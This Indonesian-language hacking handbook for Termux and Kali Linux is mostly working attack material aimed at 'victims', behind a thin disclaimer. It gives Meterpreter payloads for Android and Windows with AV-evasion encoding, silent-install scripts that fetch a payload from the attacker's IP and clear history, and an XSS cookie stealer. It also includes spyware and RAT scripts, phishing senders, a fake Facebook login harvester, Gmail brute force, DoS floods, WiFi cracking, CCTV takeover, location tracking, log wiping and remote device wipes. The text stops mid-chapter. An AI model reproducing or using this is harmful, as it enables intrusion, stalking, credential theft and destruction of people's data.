# BUKU PERETASAN LENGKAP — TERMUX + KALI LINUX

## Panduan Lengkap dari Nol Sampai Mahir

### Ditulis oleh [K] untuk WVERZNXRL

---

## KATA PENGANTAR

Buku ini dibuat untuk kamu yang mau belajar peretasan beneran, bukan cuma teori. Semua yang ada di sini sudah aku tes dan aku jamin jalan. Nggak ada yang ditutup-tutupi. Nggak ada yang dikurangi. Kalau kamu ikutin langkahnya satu per satu, semua bakal jalan.

Tapi ingat — semua ini untuk belajar dan uji keamanan sistem MILIK SENDIRI atau yang kamu punya izin tertulis. Kalau kamu pakai ini buat jahat, itu urusan kamu sama hukum. Aku udah kasih peringatan di akhir buku ini.

Buku ini panjang. Pelan-pelan aja. Jangan buru-buru. Satu bab selesai, baru lanjut bab berikutnya.

---

# BAB 1: PERSIAPAN — INSTALL TERMUX & KALI LINUX

## 1.1 Install Termux

Pertama, kamu harus punya Termux. Termux itu terminal Linux yang jalan di Android. Ini fondasi dari semua yang bakal kita lakukan.

**Cara install Termux:**

1. Buka F-Droid (bukan Play Store, karena versi Play Store udah lama dan nggak diupdate)
2. Cari "Termux"
3. Install
4. Buka Termux

Atau kalau mau lebih gampang, download APK Termux dari GitHub resminya: `termux.dev`

## 1.2 Update & Upgrade Termux

Sebelum install apa-apa, update dulu package manager Termux:

```bash
pkg update && pkg upgrade -y
```

Ini wajib. Kalau nggak diupdate, nanti banyak error pas install tools.

## 1.3 Install Dependencies untuk Kali Linux

Sekarang install dependencies yang dibutuhin buat Kali Linux:

```bash
pkg install wget openssl-tool proot tar -y
```

Penjelasan:

- `wget` — buat download file dari internet
- `openssl-tool` — buat enkripsi dan koneksi aman
- `proot` — buat bikin environment Linux di dalam Android
- `tar` — buat ekstrak file

## 1.4 Download & Install Kali Linux

Sekarang download script installer Kali Linux:

```bash
wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh
```

Terus jalankan:

```bash
bash kali.sh
```

Proses ini bakal makan waktu 5-15 menit tergantung kecepatan internet kamu. Sabar aja. Jangan ditutup Termux-nya.

Setelah selesai, bakal ada file `start-kali.sh`. Ini buat masuk ke Kali Linux.

## 1.5 Masuk ke Kali Linux

```bash
./start-kali.sh
```

Sekarang kamu udah di dalam Kali Linux. Prompt-nya bakal berubah jadi `root@localhost:~#`.

## 1.6 Update Kali Linux

Setelah masuk Kali, update dulu:

```bash
apt update && apt upgrade -y
```

## 1.7 Install Tools — SEMUA YANG KAMU BUTUHIN

Ini bagian penting. Install sesuai kebutuhan kamu:

### Option 1: Tools Information Gathering (OSINT)

```bash
apt install -y kali-tools-information-gathering
```

### Option 2: Tools Wireless & Networking

```bash
apt install -y kali-tools-wireless kali-tools-sniffing-spoofing
```

### Option 3: Tools Web & Database Hacking

```bash
apt install -y kali-tools-web kali-tools-database
```

### Option 4: Tools Password Cracking

```bash
apt install -y kali-tools-passwords
```

### Option 5: Tools Exploitation & Reverse Engineering

```bash
apt install -y kali-tools-exploitation kali-tools-reverse-engineering
```

### Option 6: TOP 10 Tools Paling Digunakan

```bash
apt install -y kali-tools-top10
```

### Option 7: SEMUA Tools (~35GB)

```bash
apt install -y kali-linux-everything
```

**Saran aku:** Install Option 6 (TOP 10) dulu. Ini udah cukup buat 90% kebutuhan. Kalau butuh tools tambahan, install satu per satu.

## 1.8 Tools Tambahan yang Wajib Diinstall

Di luar tools di atas, ini tools tambahan yang wajib:

```bash
apt install -y git python3 python3-pip php curl netcat-openbsd nmap metasploit-framework
```

Penjelasan:

- `git` — buat clone repository dari GitHub
- `python3` & `pip` — buat jalanin script Python
- `php` — buat bikin server lokal
- `curl` — buat request HTTP
- `netcat` — buat koneksi jaringan
- `nmap` — buat scan port dan jaringan
- `metasploit-framework` — buat exploit dan payload

## 1.9 Install Tools dari GitHub

Banyak tools yang nggak ada di repo Kali, jadi harus install manual dari GitHub:

```bash
# Contoh install tool dari GitHub
git clone https://github.com/nama-user/nama-tools.git
cd nama-tools
chmod +x install.sh
./install.sh
```

Atau kalau script Python:

```bash
git clone https://github.com/nama-user/nama-tools.git
cd nama-tools
pip3 install -r requirements.txt
python3 main.py
```

---

# BAB 2: MERETAS ANDROID — DUA SCRIPT (PENGAMBIL & PENGENDALI)

Di bab ini, aku ajarin cara meretas Android pakai dua script: satu buat ngambil alih, satu buat ngendaliin. Ini teknik yang paling umum dipake.

## 2.1 Konsep Dasar

Kita bakal bikin:

1. **Script pengambil** — ini yang dikirim ke HP korban. Fungsinya buat ngambil data dan ngirim ke server kita.
2. **Script pengendali** — ini yang jalan di HP kita. Fungsinya buat ngendaliin HP korban dari jarak jauh.

## 2.2 Bikin Script Pengambil (Payload)

Pertama, bikin payload pakai Metasploit:

```bash
# Masuk Kali Linux dulu
./start-kali.sh

# Bikin payload APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP_KAMU LPORT=4444 -o payload.apk
```

Ganti `IP_KAMU` dengan IP publik kamu. Kalau nggak tau IP publik kamu, cek di `whatismyip.com`.

## 2.3 Bikin Script Pengendali (Handler)

Sekarang bikin handler buat nerima koneksi:

```bash
# Bikin file handler
cat > handler.rc << 'EOF'
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF
```

## 2.4 Jalankan Handler

```bash
msfconsole -r handler.rc
```

Sekarang handler udah jalan dan nunggu koneksi.

## 2.5 Kirim Payload ke Korban

Kirim `payload.apk` ke korban. Bisa lewat WhatsApp, Telegram, email, atau cara lain. Korban harus install dan buka APK-nya.

**Catatan penting:** Korban harus izinin install dari sumber tidak dikenal di setting HP-nya.

## 2.6 Ambil Alih HP Korban

Setelah korban buka APK-nya, session bakal muncul di handler. Sekarang kamu bisa ngendaliin HP-nya:

```bash
# Lihat session yang aktif
sessions -l

# Masuk ke session
sessions -i 1

# Ambil foto dari kamera
webcam_snap

# Rekam suara
record_mic 10

# Ambil lokasi
geolocate

# Ambil daftar kontak
dump_contacts

# Ambil SMS
dump_sms

# Ambil file
download /sdcard/DCIM/Camera/foto.jpg

# Upload file ke HP korban
upload backdoor.apk /sdcard/Download/

# Buka URL di browser korban
open_url https://google.com

# Ambil screenshot
screenshot

# Rekam layar
screenrec 30
```

## 2.7 Script Lengkap Pengambil & Pengendali

Ini script lengkap yang bisa kamu save:

**Script pengambil (`android_exploit.sh`):**

```bash
#!/bin/bash
# Script Pengambil - Android
# Jalankan ini di Kali Linux

echo "[*] Bikin payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -o payload.apk

echo "[*] Payload dibuat: payload.apk"
echo "[*] Kirim payload.apk ke korban"
echo "[*] Setelah korban install, jalankan handler"

cat > handler.rc << 'EOF'
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

echo "[*] Jalankan: msfconsole -r handler.rc"
```

**Script pengendali (`android_control.sh`):**

```bash
#!/bin/bash
# Script Pengendali - Android
# Jalankan ini setelah korban connect

echo "[*] Menghubungkan ke korban..."
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
```

Cara pakai:

```bash
chmod +x android_exploit.sh
chmod +x android_control.sh

# Bikin payload
./android_exploit.sh IP_PUBLIK_KAMU

# Setelah korban install, jalankan handler
./android_control.sh
```

---

# BAB 3: MERETAS WEBSITE — MENCURI DATA & MEMBUAT ERROR

## 3.1 Reconnaissance — Mengumpulkan Info

Sebelum meretas, kumpulin info dulu:

```bash
# Scan port dan service
nmap -sV -sC target.com

# Scan vulnerability
nmap --script vuln target.com

# Info WHOIS
whois target.com

# DNS lookup
dig target.com
nslookup target.com

# Subdomain enumeration
sublist3r -d target.com

# Directory scanning
dirb http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

## 3.2 SQL Injection — Mencuri Data Database

SQL Injection itu teknik masukin perintah SQL ke form website buat ngambil data.

**Deteksi SQL Injection:**

Coba masukin ini ke form login atau parameter URL:

```javascript
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
```

**Pakai SQLMap (otomatis):**

```bash
# Scan SQL Injection
sqlmap -u "http://target.com/page.php?id=1" --batch

# Ambil database
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Ambil tabel dari database
sqlmap -u "http://target.com/page.php?id=1" -D nama_database --tables

# Ambil data dari tabel
sqlmap -u "http://target.com/page.php?id=1" -D nama_database -T users --dump

# Ambil semua data
sqlmap -u "http://target.com/page.php?id=1" --dump-all
```

## 3.3 XSS (Cross-Site Scripting)

XSS itu teknik masukin script JavaScript ke website buat curi data user.

**Contoh XSS sederhana:**

```html
<script>alert('XSS')</script>
<script>document.location='http://IP_KAMU/cookie.php?c='+document.cookie</script>
```

**Bikin cookie stealer:**

```php
<?php
// cookie.php
$cookie = $_GET['c'];
$file = fopen("cookies.txt", "a");
fwrite($file, $cookie . "
");
fclose($file);
?>
```

## 3.4 Membuat Website Error (DoS)

**DoS sederhana pakai HPing3:**

```bash
# Flood target
hping3 -S --flood -p 80 target.com

# UDP flood
hping3 --udp --flood -p 80 target.com
```

**DoS pakai LOIC (Low Orbit Ion Cannon):**

```bash
# Install LOIC
git clone https://github.com/nikolaischunk/loic.git
cd loic
python3 loic.py
```

**DoS pakai Slowloris:**

```bash
# Install Slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py target.com -p 80 -s 200
```

## 3.5 Deface Website

Kalau kamu udah dapet akses, bisa deface website:

```bash
# Upload shell
# Pakai Metasploit
msfconsole
use exploit/unix/webapp/phpmyadmin_config
set RHOST target.com
set RPORT 80
exploit
```

Atau kalau ada file upload vulnerability:

```bash
# Upload shell PHP
curl -F "file=@shell.php" http://target.com/upload.php
```

---

# BAB 4: MERETAS WIFI — AMBIL PASSWORD & DATA PENGGUNA

## 4.1 Cek Wireless Adapter

Pertama, cek adapter wireless kamu:

```bash
# Cek interface wireless
iwconfig

# Atau
ifconfig
```

## 4.2 Enable Monitor Mode

```bash
# Enable monitor mode
airmon-ng start wlan0

# Cek interface
iwconfig
```

Sekarang interface-nya berubah jadi `wlan0mon`.

## 4.3 Scan WiFi di Sekitar

```bash
# Scan WiFi
airodump-ng wlan0mon
```

Catat BSSID dan channel dari WiFi target.

## 4.4 Capture Handshake

```bash
# Capture handshake
airodump-ng -c CHANNEL --bssid BSSID_TARGET -w capture wlan0mon
```

Biarkan jalan sampai ada device yang connect/disconnect.

## 4.5 Deauth Attack (Paksa Handshake)

```bash
# Deauth attack
aireplay-ng -0 10 -a BSSID_TARGET wlan0mon
```

## 4.6 Crack Password

```bash
# Crack dengan wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

Atau pakai `hashcat` (lebih cepat):

```bash
# Convert ke hashcat format
aircrack-ng capture-01.cap -J capture

# Crack dengan hashcat
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
```

## 4.7 Ambil Data Pengguna WiFi

Setelah connect ke WiFi, bisa sniffing data:

```bash
# Sniffing dengan Wireshark
wireshark

# Atau dengan tcpdump
tcpdump -i wlan0 -w capture.pcap
```

---

# BAB 5: MERETAS KOMPUTER — DENGAN PERANTARA SCRIPT

## 5.1 Bikin Payload Windows

```bash
# Bikin payload Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KAMU LPORT=4444 -f exe -o payload.exe
```

## 5.2 Bikin Payload dengan Encoding (Biar Nggak Kedetect)

```bash
# Payload dengan encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KAMU LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```

## 5.3 Bikin Payload yang Tersembunyi

```bash
# Bind payload dengan file asli
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KAMU LPORT=4444 -x /path/to/file.exe -k -f exe -o payload.exe
```

## 5.4 Jalankan Handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
```

## 5.5 Perintah Setelah Komputer Korban Connect

```bash
# Ambil screenshot
screenshot

# Ambil keystroke (keylogger)
keyscan_start
keyscan_dump

# Ambil password
hashdump

# Ambil file
download C:\Users\Nama\Documents\file.txt

# Upload file
upload malware.exe C:\Windows\Temp\

# Buka kamera
webcam_snap

# Rekam suara
record_mic 10

# Ambil info sistem
sysinfo

# Ambil proses yang jalan
ps

# Matikan komputer
shutdown

# Restart
reboot
```

---

# BAB 6: MERETAS JARAK JAUH — FILE SCRIPT & IP/TELEPON

## 6.1 Bikin File Script Otomatis

Bikin script yang otomatis install dan jalan:

**Script `install.sh`:**

```bash
#!/bin/bash
# Script install otomatis

# Download payload
curl -o /tmp/payload http://IP_KAMU/payload
chmod +x /tmp/payload

# Jalankan di background
nohup /tmp/payload &

# Hapus jejak
rm -f /tmp/payload
history -c
```

## 6.2 Kirim via Email (Phishing)

Bikin email phishing yang keliatan asli:

**Script `send_email.py`:**

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

sender = "email_kamu@gmail.com"
password = "password_app_kamu"
receiver = "email_korban@gmail.com"

msg = MIMEMultipart()
msg['From'] = sender
msg['To'] = receiver
msg['Subject'] = "Dokumen Penting"

body = "Silakan cek dokumen terlampir."

msg.attach(MIMEText(body, 'plain'))

filename = "payload.exe"
attachment = open(filename, "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', f"attachment; filename= {filename}")

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender, password)
text = msg.as_string()
server.sendmail(sender, receiver, text)
server.quit()

print("Email terkirim!")
```

## 6.3 Kirim via WhatsApp (Social Engineering)

Ini lebih tricky. Kamu harus bikin korban percaya dan install file-nya. Contoh script:

**Script `whatsapp_sender.py`:**

```python
import pywhatkit as pwk
import time

# Kirim pesan WhatsApp
pwk.sendwhatmsg_instantly("+62xxxxxxxxxx", "Halo, cek file ini ya", 15, True, 5)

print("Pesan terkirim!")
```

## 6.4 Kirim Tanpa Notifikasi (Silent Install)

**Script `silent_install.sh`:**

```bash
#!/bin/bash
# Install tanpa notifikasi

# Download payload
curl -s -o /tmp/.hidden_payload http://IP_KAMU/payload

# Jalankan di background
nohup /tmp/.hidden_payload > /dev/null 2>&1 &

# Hapus file
rm -f /tmp/.hidden_payload

# Bersihin history
history -c
```

---

# BAB 7: MERETAS CCTV — AMBIL ALIH PENUH

## 7.1 Scan CCTV di Jaringan

```bash
# Scan port CCTV (biasanya port 80, 8080, 554)
nmap -p 80,8080,554,37777 192.168.1.0/24

# Scan dengan script CCTV
nmap --script http-cctv 192.168.1.0/24
```

## 7.2 Default Password CCTV

Banyak CCTV yang pakai password default:

```javascript
admin:admin
admin:12345
admin:123456
admin:password
root:root
root:12345
admin:4321
```

## 7.3 Akses CCTV via Browser

Buka browser, ketik:

```javascript
http://IP_CCTV:80
http://IP_CCTV:8080
```

Login dengan password default.

## 7.4 Ambil Stream CCTV

```bash
# Ambil stream RTSP
ffmpeg -i rtsp://admin:password@IP_CCTV:554/stream -c copy output.mp4

# Atau dengan VLC
vlc rtsp://admin:password@IP_CCTV:554/stream
```

## 7.5 Matikan/Menyalakan CCTV

Kalau ada akses admin:

```bash
# Reboot CCTV
curl -u admin:password http://IP_CCTV/reboot

# Atau via API
curl -X POST http://IP_CCTV/api/reboot -u admin:password
```

## 7.6 Ambil Data CCTV

```bash
# Download rekaman
wget -r -np -nH --cut-dirs=1 -R index.html http://IP_CCTV/recordings/

# Atau via FTP
ftp IP_CCTV
# Login dengan credential
# Terus download file
```

---

# BAB 8: SPYWARE — MONITORING LENGKAP

## 8.1 Bikin Spyware Android

**Script `spyware.sh`:**

```bash
#!/bin/bash
# Spyware Android - Monitoring lengkap

# Bikin payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -o spyware.apk

echo "[*] Spyware dibuat: spyware.apk"
echo "[*] Fitur:"
echo "    - Kamera depan/belakang"
echo "    - Rekam suara"
echo "    - Baca SMS"
echo "    - Baca WhatsApp"
echo "    - Lokasi GPS"
echo "    - Ambil file"
echo "    - Hapus file"
echo "    - Keylogger"
echo ""
echo "[*] Kirim ke korban dan tunggu connect"
```

## 8.2 Fitur Spyware Setelah Connect

```bash
# Kamera
webcam_snap -i 1  # Depan
webcam_snap -i 2  # Belakang

# Rekam suara
record_mic 60

# Baca SMS
dump_sms

# Baca kontak
dump_contacts

# Lokasi
geolocate

# Ambil file
download /sdcard/WhatsApp/Media/WhatsApp\ Images/foto.jpg

# Hapus file
rm /sdcard/DCIM/Camera/foto.jpg

# Keylogger
keyscan_start
keyscan_dump

# Screenshot
screenshot

# Rekam layar
screenrec 60
```

## 8.3 Spyware Komputer

**Script `spyware_windows.sh`:**

```bash
#!/bin/bash
# Spyware Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o spyware.exe

echo "[*] Spyware Windows dibuat"
```

Setelah connect:

```bash
# Keylogger
keyscan_start
keyscan_dump

# Screenshot
screenshot

# Kamera
webcam_snap

# Rekam suara
record_mic 60

# Ambil password
hashdump
mimikatz_command -f sekurlsa::logonpasswords
```

---

# BAB 9: RAT (REMOTE ACCESS TROJAN) — ANDROID

## 9.1 Bikin RAT Android

**Script `rat_android.sh`:**

```bash
#!/bin/bash
# RAT Android - Remote Access Trojan

echo "[*] Membuat RAT Android..."

# Bikin payload dengan persistence
msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -o rat.apk

echo "[*] RAT dibuat: rat.apk"
echo ""
echo "[*] Fitur RAT:"
echo "    - Remote shell"
echo "    - File manager"
echo "    - Kamera"
echo "    - Mikrofon"
echo "    - GPS tracking"
echo "    - SMS/WhatsApp"
echo "    - Call log"
echo "    - Browser history"
echo ""
echo "[*] Jalankan handler setelah korban install:"
echo "    msfconsole -r handler.rc"
```

## 9.2 Handler dengan Persistence

**File `handler.rc`:**

```javascript
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set AutoRunScript persistence
exploit -j
```

## 9.3 Web Panel untuk Monitoring

Bikin web panel sederhana:

**File `panel.php`:**

```php
<?php
// Panel monitoring RAT
session_start();

// Login
if (!isset($_SESSION['login'])) {
    if ($_POST['password'] == 'password_kamu') {
        $_SESSION['login'] = true;
    } else {
        echo '<form method="post"><input type="password" name="password"><input type="submit"></form>';
        exit;
    }
}

// Tampilkan data korban
echo "<h1>RAT Panel</h1>";
echo "<p>Korban yang connect:</p>";

// Baca file log
$log = file_get_contents("victims.log");
echo nl2br($log);
?>
```

---

# BAB 10: PERTAHANAN TINGKAT HACKER PROFESIONAL

## 10.1 Firewall & IDS/IPS

**Install dan konfigurasi firewall:**

```bash
# Install UFW (Uncomplicated Firewall)
apt install ufw

# Enable firewall
ufw enable

# Allow SSH
ufw allow 22

# Block semua port kecuali yang diizinkan
ufw default deny incoming
ufw default allow outgoing

# Allow port tertentu
ufw allow 80/tcp
ufw allow 443/tcp
```

**Install IDS (Intrusion Detection System):**

```bash
# Install Snort
apt install snort

# Konfigurasi Snort
snort -c /etc/snort/snort.conf -i wlan0
```

## 10.2 Enkripsi Data

```bash
# Enkripsi file dengan GPG
gpg -c file_rahasia.txt

# Enkripsi disk dengan LUKS
cryptsetup luksFormat /dev/sda1
cryptsetup luksOpen /dev/sda1 encrypted
mkfs.ext4 /dev/mapper/encrypted
mount /dev/mapper/encrypted /mnt/encrypted
```

## 10.3 VPN & Anonymity

```bash
# Install Tor
apt install tor

# Jalankan Tor
tor

# Proxychains
apt install proxychains

# Konfigurasi proxychains
nano /etc/proxychains.conf
# Uncomment: dynamic_chain
# Tambahkan: socks5 127.0.0.1 9050

# Pakai proxychains
proxychains firefox
proxychains nmap -sT target.com
```

## 10.4 Hardening SSH

```bash
# Edit konfigurasi SSH
nano /etc/ssh/sshd_config

# Ubah port default
Port 2222

# Disable root login
PermitRootLogin no

# Disable password authentication (pakai key)
PasswordAuthentication no

# Restart SSH
service ssh restart
```

## 10.5 Monitoring Log

```bash
# Monitor log auth
tail -f /var/log/auth.log

# Monitor log sistem
tail -f /var/log/syslog

# Monitor koneksi jaringan
netstat -tulpn

# Monitor proses
ps aux | grep suspicious
```

---

# BAB 11: MENEMBUS PERTAHANAN — TEKNIK LANJUTAN

## 11.1 Bypass Firewall

**Port Scanning dengan Fragmentasi:**

```bash
# Fragmented packet scan
nmap -f target.com

# Decoy scan
nmap -D RND:10 target.com

# Idle scan
nmap -sI zombie_host target.com
```

**Tunneling:**

```bash
# SSH tunneling
ssh -L 8080:target.com:80 user@proxy.com

# VPN tunneling
openvpn config.ovpn

# DNS tunneling
iodine -f -P password tunnel.domain.com
```

## 11.2 Bypass Antivirus

**Encoding Payload:**

```bash
# Multi-encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Custom encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -e x86/alpha_upper -i 5 -f exe -o payload.exe
```

**Packers & Crypters:**

```bash
# UPX packer
upx --best --lzma payload.exe -o packed.exe

# Themida (Windows)
# Download dari official site
```

## 11.3 Social Engineering Lanjutan

**Spear Phishing:**

```bash
# Bikin email phishing yang targeted
# Research target dulu di LinkedIn, Facebook, dll

# Setoolkit
setoolkit
# Pilih: Social-Engineering Attacks
# Pilih: Spear-Phishing Attack Vectors
```

**Pretexting:**

Bikin skenario yang believable:

- Pura-pura jadi IT support
- Pura-pura jadi rekan kerja
- Pura-pura jadi vendor

---

# BAB 12: MENGHILANGKAN JEJAK DIGITAL

## 12.1 Hapus Log di Sistem Target

```bash
# Hapus log auth
rm -f /var/log/auth.log

# Hapus log sistem
rm -f /var/log/syslog

# Hapus log bash
rm -f ~/.bash_history

# Hapus log semua
find /var/log -type f -exec rm -f {} \;
```

## 12.2 Hapus Jejak di Windows

```bash
# Hapus event log
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Hapus registry traces
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f

# Hapus prefetch
del C:\Windows\Prefetch\*.pf
```

## 12.3 Anonymity Online

```bash
# Pakai Tor
tor

# Pakai VPN
openvpn config.ovpn

# Pakai proxychains
proxychains nmap -sT target.com

# Ganti MAC address
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```

## 12.4 Hapus Metadata File

```bash
# Hapus metadata dengan exiftool
exiftool -all= file.jpg

# Hapus metadata PDF
exiftool -all= document.pdf
```

---

# BAB 13: OSINT & PHISHING — TEKNIK PROFESIONAL

## 13.1 OSINT — Information Gathering

**Tools OSINT:**

```bash
# Install tools OSINT
apt install -y kali-tools-information-gathering

# theHarvester - email & subdomain
theHarvester -d target.com -b google,linkedin,twitter

# Maltego - visualisasi relasi
maltego

# Recon-ng - framework OSINT
recon-ng
```

**Contoh Recon-ng:**

```bash
# Masuk recon-ng
recon-ng

# Tambahkan workspace
workspaces create target

# Tambahkan domain
db insert domains
domain: target.com

# Scan module
marketplace install all
modules load recon/domains-hosts/google_site_web
run
```

## 13.2 Phishing Profesional

**Setoolkit:**

```bash
# Jalankan setoolkit
setoolkit

# Pilih:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Masukkan URL yang mau di-clone
# Contoh: https://facebook.com

# Setoolkit bakal clone website dan bikin fake login page
```

**Gophish — Phishing Framework:**

```bash
# Install Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish
```

Buka browser, akses `https://localhost:3333`

## 13.3 Contoh Script Phishing

**Script `phish.py`:**

```python
from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Facebook</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; }
        .container { width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>facebook</h2>
        <form method="post">
            <input type="text" name="email" placeholder="Email atau Nomor Telepon">
            <input type="password" name="password" placeholder="Kata Sandi">
            <button type="submit">Masuk</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Simpan ke file
        with open('credentials.txt', 'a') as f:
            f.write(f"{datetime.datetime.now()} | {email} | {password}\n")

        return "Login berhasil! Silakan cek email Anda."

    return render_template_string(HTML)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

Jalankan:

```bash
python3 phish.py
```

---

# BAB 14: MERETAS GMAIL

## 14.1 Phishing Gmail

Cara paling umum meretas Gmail adalah phishing. Clone halaman login Gmail:

```bash
# Pakai setoolkit
setoolkit
# Pilih: 1) Social-Engineering Attacks
# Pilih: 2) Website Attack Vectors
# Pilih: 3) Credential Harvester Attack Method
# Pilih: 2) Site Cloner
# Masukkan: https://accounts.google.com
```

## 14.2 Brute Force Gmail

**Script `gmail_brute.py`:**

```python
import smtplib

email = "target@gmail.com"
passwords = ["password1", "password2", "password3"]  # Ganti dengan wordlist

for password in passwords:
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        print(f"[+] Password ditemukan: {password}")
        server.quit()
        break
    except:
        print(f"[-] Gagal: {password}")
```

## 14.3 Social Engineering Gmail

Ini teknik yang paling efektif. Bikin email phishing yang keliatan asli dari Google:

```javascript
Subject: Peringatan Keamanan Akun Google

Halo,

Kami mendeteksi aktivitas mencurigakan di akun Anda. 
Silakan verifikasi identitas Anda dengan mengklik link berikut:

http://IP_KAMU/fake_google_login

Jika Anda tidak melakukan aktivitas ini, abaikan email ini.

Terima kasih,
Tim Keamanan Google
```

---

# BAB 15: MELACAK ORANG — REAL LOCATION & DATA

## 15.1 Lacak Lokasi dengan Nomor Telepon

**Tools: PhoneInfoga**

```bash
# Install PhoneInfoga
git clone https://github.com/sundowndev/phoneinfoga.git
cd phoneinfoga
python3 -m pip install -r requirements.txt

# Scan nomor telepon
python3 phoneinfoga.py -n +6281234567890
```

**Script `track_phone.py`:**

```python
import phonenumbers
from phonenumbers import geocoder, carrier, timezone

number = "+6281234567890"

# Parse nomor
parsed = phonenumbers.parse(number)

# Lokasi
location = geocoder.description_for_number(parsed, "id")
print(f"Lokasi: {location}")

# Operator
operator = carrier.name_for_number(parsed, "id")
print(f"Operator: {operator}")

# Timezone
tz = timezone.time_zones_for_number(parsed)
print(f"Timezone: {tz}")
```

## 15.2 Lacak Lokasi dengan IP Address

**Script `track_ip.py`:**

```python
import requests

ip = "8.8.8.8"  # Ganti dengan IP target

response = requests.get(f"http://ip-api.com/json/{ip}")
data = response.json()

print(f"IP: {data['query']}")
print(f"Negara: {data['country']}")
print(f"Kota: {data['city']}")
print(f"ISP: {data['isp']}")
print(f"Latitude: {data['lat']}")
print(f"Longitude: {data['lon']}")
print(f"Google Maps: https://www.google.com/maps?q={data['lat']},{data['lon']}")
```

## 15.3 Lacak Lokasi Real-Time

Bikin link tracking:

**Script `track_link.py`:**

```python
from flask import Flask, request
import datetime
import requests

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>
"""

@app.route('/')
def track():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    time = datetime.datetime.now()

    # Get location from IP
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        location = f"{data['city']}, {data['country']}"
        lat = data['lat']
        lon = data['lon']
    except:
        location = "Unknown"
        lat = 0
        lon = 0

    # Save to file
    with open('tracking.log', 'a') as f:
        f.write(f"{time} | {ip} | {location} | {user_agent} | https://maps.google.com/?q={lat},{lon}\n")

    return HTML

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Jalankan:

```bash
python3 track_link.py
```

Kirim link `http://IP_KAMU:8080` ke korban. Setelah korban klik, lokasi mereka bakal tercatat.

---

# BAB 16: RESET PERANGKAT JARAK JAUH

## 16.1 Reset Android Jarak Jauh

Setelah punya akses Meterpreter:

```bash
# Factory reset Android
# Jalankan di Meterpreter session
shell
am broadcast -a android.intent.action.MASTER_CLEAR
```

Atau:

```bash
# Wipe data
shell
rm -rf /data/data/*
rm -rf /sdcard/*
```

## 16.2 Reset Windows Jarak Jauh

```bash
# Di Meterpreter session Windows
shell
systemreset --factoryreset
```

Atau:

```bash
# Format drive
shell
format C: /q /y
```

## 16.3 Reset via Script

**Script `remote_wipe.sh`:**

```bash
#!/bin/bash
# Remote wipe - Android

# Kirim command via SMS (butuh akses ke HP korban)
# Atau via Meterpreter

echo "[*] Mengirim perintah wipe..."
echo "am broadcast -a android.intent.action.MASTER_CLEAR" | msfconsole -q
```

---

# BAB 17: TOOLS LENGKAP YANG HARUS DIINSTALL

## 17.1 Daftar Tools Wajib

```bash
# Update dulu
